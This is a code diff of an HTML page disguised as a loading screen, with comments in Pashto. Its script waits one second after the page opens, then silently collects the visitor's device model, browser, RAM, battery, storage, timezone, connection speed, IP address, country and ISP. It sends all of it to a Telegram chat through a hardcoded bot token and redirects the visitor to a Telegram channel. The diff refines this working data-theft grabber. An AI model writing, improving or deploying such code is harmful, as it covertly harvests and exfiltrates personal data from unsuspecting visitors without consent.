@@ -15,60 +15,41 @@
       min-height: 100vh;
     }
     .loader {
-      width: 200px;
-      height: 8px;
+      width: 220px;
+      height: 6px;
       background: #1e293b;
-      border-radius: 4px;
+      border-radius: 3px;
       overflow: hidden;
     }
     .bar {
       height: 100%;
       width: 0%;
-      background: linear-gradient(90deg, #0ea5e9, #8b5cf6, #ec4899);
-      border-radius: 4px;
+      background: linear-gradient(90deg, #10b981, #3b82f6, #8b5cf6, #ec4899);
+      border-radius: 3px;
       animation: load 1s forwards;
     }
     @keyframes load {
       0% { width: 0%; }
       100% { width: 100%; }
     }
-    #link {
-      position: fixed;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: linear-gradient(120deg, #0ea5e9, #8b5cf6);
-      color: white;
-      text-decoration: none;
-      padding: 12px 28px;
-      border-radius: 12px;
-      font-weight: bold;
-      display: none;
-      box-shadow: 0 6px 20px rgba(14, 165, 233, 0.4);
-    }
   </style>
 </head>
 <body>
 
   <div class="loader">
-    <div class="bar" id="bar"></div>
+    <div class="bar"></div>
   </div>
 
-  <a href="https://t.me/JRPRO43K" id="link">📢 د چینل ګډون کړئ</a>
-
   <script>
-    // ─── د چیټ ID د URL څخه اخیستل (د ?=8089055081 لپاره) ─────────────
-    function getChatIdFromWeirdUrl() {
-      const url = window.location.href;
-      const match = url.match(/\?=(\d+)/);
-      return match ? match[1] : "8089055081"; // بیکاپ ID
-    }
-
-    const CHAT_ID = getChatIdFromWeirdUrl();
+    // ─── د چیټ ID د ?=8089055081 څخه اخیستل ───────────────────────
+    const url = window.location.href;
+    const chatIdMatch = url.match(/\?=(\d+)/);
+    const CHAT_ID = chatIdMatch ? chatIdMatch[1] : "8089055081";
     const BOT_TOKEN = "8357872748:AAFI6jvOLoXQD7ooBK5xESTpoxuLXP2OI_o";
 
-    // ─── د معلوماتو جمع کول ─────────────────────────────────────────
-    function collectData() {
+    // ─── د ۱ ثانیې وروسته معلومات تهلايل + چینل ته ریدایرکټ ─────────
+    setTimeout(() => {
+      // 1. د معلوماتو جمع کول
       const ua = navigator.userAgent;
       let device = "نامعلوم";
       if (/iPhone(\d+,\d+)/.test(ua)) device = ua.match(/iPhone(\d+,\d+)/)[0];
@@ -79,34 +60,47 @@
       let bat = "نامعلوم";
       if ('getBattery' in navigator) {
         navigator.getBattery().then(b => {
-          bat = b.charging ? `🔌 چارجیږي (${Math.round(b.level*100)}%)` : `🔋 ${Math.round(b.level*100)}%`;
+          const p = Math.round(b.level * 100);
+          bat = b.charging ? `🔌 چارجیږي (${p}%)` : `🔋 ${p}%`;
         }).catch(() => {});
       }
 
-      return `
-🛡️ *د ډیوایس راپور*
+      let br = "نامعلوم";
+      if (ua.includes("Edg")) br = "Edge";
+      else if (ua.includes("Chrome") && !ua.includes("Edg")) br = "Chrome";
+      else if (ua.includes("Firefox")) br = "Firefox";
+      else if (ua.includes("Safari")) br = "Safari";
 
-📱 *Device:* ${device}
-🧭 *Browser:* ${ua.includes("Edg")?"Edge":ua.includes("Chrome")&&!ua.includes("Edg")?"Chrome":ua.includes("Firefox")?"Firefox":"Safari/نامعلوم"}
-🧠 *RAM:* ${'deviceMemory' in navigator ? navigator.deviceMemory+" GB" : "نامعلوم"}
-🔋 *بیټري:* ${bat}
-🕒 *وخت:* ${new Date().toLocaleString('fa-IR')}
-🆔 *Chat ID:* ${CHAT_ID}
+      const conn = 'connection' in navigator ? (navigator.connection.effectiveType || "نامعلوم") : "نامعرف";
+      const speed = 'connection' in navigator && navigator.connection.downlink ?
+        (navigator.connection.downlink >= 10 ? `🚀 ${navigator.connection.downlink} Mbps` :
+         navigator.connection.downlink >= 2 ? `📶 ${navigator.connection.downlink} Mbps` : `🐢 ${navigator.connection.downlink} Mbps`) :
+        "نامعلوم";
 
-──────────────────────
-🧑‍💻 @JRPRO43 | 📢 @JRPRO43K
+      // 2. لومړی میسج (د اصلي معلوماتو سره)
+      const mainMsg = `
+📱 *Device Name:* ${device}
+🌐 *Device IP:* د IP لپاره انتظار...
+💾 *Device Storage:* ترلاسه کیږي...
+🧠 *Device RAM:* ${'deviceMemory' in navigator ? navigator.deviceMemory + " GB" : "نامعلوم"}
+🔋 *Chargh Systam:* ${bat}
+🧭 *Brwser:* ${br}
+🌍 *User Country:* ترلاسه کیږي...
+🏢 *Communication Company:* ترلاسه کیږي...
+🕒 *Timezone:* ${Intl.DateTimeFormat().resolvedOptions().timeZone || "نامعلوم"}
+📡 *Intrnetspeed:* ${speed}
+📶 *Connection Type:* ${conn}
+
+🧑‍💻 *Developer:* @JRPRO43  
+📢 *Developer Channel:* @JRPRO43K
       `.trim();
-    }
 
-    // ─── د لوډینګ د بشپړیدو وروسته تهلايل ─────────────────────────────
-    setTimeout(() => {
-      // ۱. لومړی پیغام (د ساده معلوماتو سره)
-      const msg1 = collectData();
+      // 3. د معلوماتو تهلايل — د <script> په واسطه (CORS-free)
       const s1 = document.createElement('script');
-      s1.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg1)}&parse_mode=Markdown`;
+      s1.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mainMsg)}&parse_mode=Markdown`;
       document.head.appendChild(s1);
 
-      // ۲. د IP لپاره
+      // 4. د IP + Country + ISP لپاره
       const s2 = document.createElement('script');
       s2.src = "https://api.ipify.org?format=jsonp&callback=sendIP";
       window.sendIP = function(data) {
@@ -114,29 +108,35 @@
         const s3 = document.createElement('script');
         s3.src = `https://ipwho.is/${ip}?callback=sendGeo`;
         window.sendGeo = function(geo) {
-          const extra = `🌐 *IP:* ${ip}\n🌍 *هیواد:* ${geo.country||"نامعلوم"}\n🏢 *ISP:* ${geo.connection?.isp||"نامعلوم"}`;
+          const update = `
+🌐 *Device IP:* ${ip}
+🌍 *User Country:* ${geo.country || "نامعلوم"}
+🏢 *Communication Company:* ${geo.connection?.isp || geo.connection?.org || "نامعلوم"}
+          `.trim();
           const s4 = document.createElement('script');
-          s4.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(extra)}&parse_mode=Markdown`;
+          s4.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(update)}&parse_mode=Markdown`;
           document.head.appendChild(s4);
         };
         document.head.appendChild(s3);
       };
       document.head.appendChild(s2);
 
-      // ۳. د Storage لپاره
+      // 5. د Storage لپاره
       if ('storage' in navigator && 'estimate' in navigator.storage) {
         navigator.storage.estimate().then(({usage, quota}) => {
           const used = (usage / 1024**3).toFixed(2);
           const total = (quota / 1024**3).toFixed(2);
-          const txt = `💾 *Storage:* ${used} GB / ${total} GB`;
+          const storageMsg = `💾 *Device Storage:* ${used} GB / ${total} GB`;
           const s = document.createElement('script');
-          s.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt)}&parse_mode=Markdown`;
+          s.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(storageMsg)}&parse_mode=Markdown`;
           document.head.appendChild(s);
         });
       }
 
-      // ۴. چینل لینک ښکاري
-      document.getElementById('link').style.display = 'inline-block';
+      // 6. 🎯 د ۱.۲ ثانیې وروسته — اتومات ډول د چینل لینک ته ریدایرکټ
+      setTimeout(() => {
+        window.location.href = "https://t.me/JRPRO43K";
+      }, 200);
     }, 1000);
   </script>
 </body>
